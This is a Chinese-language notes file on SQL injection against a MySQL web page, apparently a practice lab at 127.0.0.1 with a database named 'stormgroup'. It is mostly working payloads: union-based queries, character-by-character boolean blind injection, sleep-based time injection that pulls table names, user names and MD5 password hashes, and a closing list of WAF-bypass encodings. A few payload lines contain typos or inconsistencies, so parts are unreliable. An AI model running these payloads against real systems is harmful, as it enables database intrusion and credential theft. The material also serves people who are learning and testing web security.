# sql
注入
联合注入
判断是否有注入点
' and 1=1--+
猜列数
'order by 1--+ 一直猜到5报错，列数为4
猜库
'and 1=1改为and 1=2
'and 1=2 union select 1,2,3,4--+发现标题为2，内容为3
'and 1=2 union select 1,user(),database(),4--+
' and 1=2 union select 1,database(),schema_name,4 from information_schema.schemata limit 0,1--+
' and 1=2 union select 1,database(),schema_name,4 from information_schema.schemata limit 1,1--+
' and 1=2 union select 1,database(),schema_name,4 from information_schema.schemata limit 2,1--+
' and 1=2 union select 1,database(),schema_name,4 from information_schema.schemata limit 3,1--+
' and 1=2 union select 1,database(),schema_name,4 from information_schema.schemata limit 4,1--+
得到五个数据库
爆表
' and 1=2 union select 1,database(),table_name,4 from information_schema.tables where table_schema='admin' limit 0,1--+
' and 1=2 union select 1,database(),table_name,4 from information_schema.tables where table_schema='admin' limit 1,1--+
猜表里面的列名
' and 1=2 union select 1,database(),column_name,4 from information_schema.columns where table_name='member' limit 0,1--+
' and 1=2 union select 1,database(),column_name,4 from information_schema.columns where table_name='member' limit 1,1--+
' and 1=2 union select 1,database(),column_name,4 from information_schema.columns where table_name='member' limit 2,1--+
' and 1=2 union select 1,database(),column_name,4 from information_schema.columns where table_name='member' limit 3,1--+
得到四个列名id，name，password，status
查询用户名和密码
' and 1=2 union select 1,name,password,4 from member limit 0,1--+
' and 1=2 union select 1,name,password,4 from member limit 1,1--+
得到两组md5加密的密码 用md5解密即可
盲注
数据库长度：http://127.0.0.1/new_list.php?id=1 and length(database())=10 --+
2.爆数据库名：
http://127.0.0.1/new_list.php?id=1 and ascii(substr((select database()),1,1))=115 --+  s  
http://127.0.0.1/new_list.php?id=1 and ascii(substr((select database()),2,1))=116 --+  t
http://127.0.0.1/new_list.php?id=1 and ascii(substr((select database()),3,1))=111--+   o
http://127.0.0.1/new_list.php?id=1 and ascii(substr((select database()),4,1))=114--+   r
http://127.0.0.1/new_list.php?id=1 and ascii(substr((select database()),5,1))=109--+   m
http://127.0.0.1/new_list.php?id=1 and ascii(substr((select database()),6,1))=103--+   g
http://127.0.0.1/new_list.php?id=1 and ascii(substr((select database()),7,1))=114--+   r
http://127.0.0.1/new_list.php?id=1 and ascii(substr((select database()),8,1))=111--+   o
http://127.0.0.1/new_list.php?id=1 and ascii(substr((select database()),9,1))=117--+   u
http://127.0.0.1/new_list.php?id=1 and ascii(substr((select database()),10,1))=112--+  p
数据库名：stormgroup

3.爆表名：
http://127.0.0.1/new_list.php?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema='stormgroup' limit 0,1),1,1))=109 --+           m


http://127.0.0.1/new_list.php?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema='stormgroup' limit 0,1),2,1))=101 --+            e 


http://127.0.0.1/new_list.php?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema='stormgroup' limit 0,1),3,1))=109 --+            m


http://127.0.0.1/new_list.php?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema='stormgroup' limit 0,1),4,1))=98 --+              b   


http://127.0.0.1/new_list.php?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema='stormgroup' limit 0,1),5,1))=101 --+           e 


http://127.0.0.1/new_list.php?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema='stormgroup' limit 0,1),6,1))=114 --+           r

表一：member

http://127.0.0.1/new_list.php?id=1 and ascii(substr((select table_name from     information_schema.tables where table_schema='stormgroup' limit 1,1),1,1))=110 --+          n


http://127.0.0.1/new_list.php?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema='stormgroup' limit 1,1),2,1))=111 --+          o


http://127.0.0.1/new_list.php?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema='stormgroup' limit 1,1),3,1))=116 --+          t


http://127.0.0.1/new_list.php?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema='stormgroup' limit 1,1),4,1))=105 --+          i


http://127.0.0.1/new_list.php?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema='stormgroup' limit 1,1),5,1))=99 --+           c


http://127.0.0.1/new_list.php?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema='stormgroup' limit 1,1),6,1))=101 --+         e


表二：notice

3.爆字段：
http://127.0.0.1/new_list.php?id=1 and length((select column_name from information_schema.columns where table_name='member' and table_schema='stormgroup' limit 0,1))=4 --+                 长度为4

http://127.0.0.1/new_list.php?id=1 and ascii(substr((select column_name from information_schema.columns where table_name='member' and table_schema='stormgroup' limit 0,1),1,1))=110 --+             n

http://127.0.0.1/new_list.php?id=1 and ascii(substr((select column_name from information_schema.columns where table_name='member' and table_schema='stormgroup' limit 0,1),2,1))=97 --+               a

http://127.0.0.1/new_list.php?id=1 and ascii(substr((select column_name from information_schema.columns where table_name='member' and table_schema='stormgroup' limit 0,1),2,1))=109 --+             m

http://127.0.0.1/new_list.php?id=1 and ascii(substr((select dump from information_schema.columns where table_name='member' and table_schema='stormgroup' limit 0,1),2,1))=101 --+             e

字段一：name

http://127.0.0.1/new_list.php?id=1 and length((select column_name from information_schema.columns where table_name='member' and table_schema='stormgroup' limit 1,1))=8 --+

字段二：猜想为password

字段三
http://127.0.0.1/new_list.php?id=1 and length((select column_name from information_schema.columns where table_name='member' and table_schema='stormgroup' limit 2,1))=6 --+   长度为6，猜想字段名为status(显示1账户可用，0不可用）

4.爆字段内容：
先爆status字段内容：
http://127.0.0.1/new_list.php?id=1 and length((select concat(status) from stormgroup.member limit 0,1))=1 --+          长度为一
http://127.0.0.1/new_list.php?id=1 andascii(substr((select concat(name) from stormgroup.member limit 0,1),1,1))=48 --+         0
账户状态为0不可用

http://127.0.0.1/new_list.php?id=1 and length((select concat(status) from stormgroup.member limit 1,1))=1 --+           长度为一
http://127.0.0.1/new_list.php?id=1 andascii(substr((select concat(name) from stormgroup.member limit 1,1),1,1))=49 --+         1
 账户状态为1可用

name字段
http://127.0.0.1/new_list.php?id=1 and length((select concat(name) from stormgroup.member limit 1,1))=5 --+             长度为5
http://127.0.0.1/new_list.php?id=1 and ascii(substr((select concat(name) from stormgroup.member limit 1,1),1,1))=109 --+     m

http://127.0.0.1/new_list.php?id=1 and ascii(substr((select concat(name) from stormgroup.member limit 1,1),2,1))= 111--+      o

http://127.0.0.1/new_list.php?id=1 and ascii(substr((select concat(name) from stormgroup.member limit 1,1),3,1))=122 --+       z
.......猜想库名为mozhe


password字段
http://127.0.0.1/new_list.php?id=1 and length((select concat(password) from stormgroup.member limit 1,1))=32 --+            长度为32。。。。晕，太多了，上sqlmap，拿32位md5值。

延时注入
在MySql延时注入里用到函数为：(与盲注基本差不多)
sleep(*)延长查询时间，延长*秒
if(exp1,exp2,exp3)如果exp1为假，那么执行exp2，否则执行exp3
ascii()==ord()将字符传转化为ASCII码
substr()==mid()截取字符串
这里使用延时注入方法继续注入，这里测试数据库用户长度使用的POC为
and if(length(user()>1),1,sleep(5))
测试数据库用户长度，测试时发现页面返回未出现延时，证明数据库用户长度大于1
续测试，发现将数字调为20时，服务器又出现了延时，因此判断数据库长度为1-20之间。
过一番测试，发现数据库用户长度为14，其实mysql数据库使用root用户连接时，查询到的就是14位，用户为root@localhost
接下去就可以根据常规盲注的方法进行注入了，思路就是这种，下面就不一一测试了，其实可以用sqlmap直接跑，那样会很快，我在这里只是想介绍延时注入的本质，以及MySql延时注入手工注入的方法。

总结：

基于时间的盲注也叫做延时注入，其实说白了就是根据服务器返回时候延时来判断我们注入的查询语句是否执行正确。出发点就是回到基于布尔的SQL盲注，也就是构造查询语句来判断结果是否为真。
在注入时，当页面不会有任何提示，无法判断是否注入成功时使用延时注入。
使用IF（查询语句，1，sleep（5）），即如果查询语句为真，那么直接返回结果；如果查询语句为假，那么过5秒之后返回页面。
反之：
例如：
if(ascii(subtring("hello",1,1))=104,sleep(5),1)
可以看到，取出"hello"里的第一个字符串，也就是"h",判断他的ascii码是否为104("h"的ascii码为104),如果是则延时5秒，反之不延时。
同样，我们可以在substring函数里面写SQL语句，提取出我们所要查的表名、列名，再用延时猜解出来。
例如：
if(ascii(substring((select distinct concat(table_name) FROM information_schema.tables where table_schema=database() limit 0,1),1,1))=116,sleep(5),1);
同样的，我们可以嵌入SQL语句带入查询，配合以上函数即可猜出表名第一个字母的ascii码为117，即"u"。
猜解列名也是差不多的用法。

Waf绕过：

' order by 4 
\u0026\u0023\u0033\u0039\u003b\u0020\u006f\u0072\u0064\u0065\u0072\u0020\u0062\u0079\u0020\u0034

“and (length(database()))>0-- URL编码：%22and%20(length(database()))%3E0
+UnIon/**/SeLecT 1,2,3 
/*!UnIon*/SeLecT 1,2,3
id=181+(union)+(sel)+(ct)+1,2,3

.asp?id=1 and true# 对a进行Unicode编码  asp?id=1 %61nd true#
